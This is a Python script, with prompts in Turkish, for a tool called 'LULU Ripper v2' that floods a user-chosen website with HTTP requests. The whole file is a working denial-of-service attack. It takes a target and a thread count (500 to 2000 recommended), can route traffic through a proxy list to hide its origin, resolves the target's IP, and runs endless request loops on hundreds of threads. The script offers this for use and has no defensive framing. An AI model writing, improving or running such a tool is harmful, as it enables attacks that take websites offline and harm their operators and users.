import requests
import threading
import time
import socket
import random
from datetime import datetime

print("[LULU Ripper v2 - Kali Optimized] Hazır.")

# Hedef ve ayarlar
TARGET_URL = input("Hedef Site[](https://ornek.com): ").strip()
if not TARGET_URL.startswith("http"):
    TARGET_URL = "https://" + TARGET_URL

THREAD_COUNT = int(input("Thread Sayısı (500-2000 önerilir): ") or "800")
DELAY_MS = 1
TIMEOUT = 3

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
}

session = requests.Session()
session.headers.update(headers)

def load_proxies():
    try:
        with open("proxies.txt", 'r') as f:
            proxies = [line.strip() for line in f if ':' in line]
        print(f"[+] {len(proxies)} proxy yüklendi.")
        return proxies
    except:
        print("[!] proxies.txt bulunamadı, proxiesiz mod.")
        return []

proxies_list = load_proxies()

def resolve_real_ip(url):
    try:
        domain = url.replace("https://", "").replace("http://", "").split("/")[0]
        ip = socket.gethostbyname(domain)
        print(f"[+] Gerçek IP çözüldü: {ip}")
        return f"http://{ip}"
    except:
        return url

def worker(thread_id):
    proxy = None
    if proxies_list:
        p = random.choice(proxies_list)
        proxy = {"http": f"http://{p}", "https": f"http://{p}"}
    
    attack_url = resolve_real_ip(TARGET_URL)
    
    while True:
        try:
            r = session.get(attack_url, proxies=proxy, timeout=TIMEOUT, allow_redirects=True)
            print(f"[T{thread_id}] {datetime.now().strftime('%H:%M:%S')} | Status: {r.status_code} | Size: {len(r.content)}")
        except:
            pass  # sessiz devam
        time.sleep(DELAY_MS / 1000.0)

def start_ripper():
    print(f"[LULU Ripper] Hedef: {TARGET_URL} | Thread: {THREAD_COUNT} | Kali Mode")
    print("[+] Saldırı başlatıldı. Ctrl+C ile durdur.")
    
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(i+1,), daemon=True)
        t.start()
    
    while True:
        time.sleep(10)

if __name__ == "__main__":
    try:
        start_ripper()
    except KeyboardInterrupt:
        print("\n[!] Ripper kapatıldı.")
    except Exception as e:
        print(f"[!] Hata: {e}")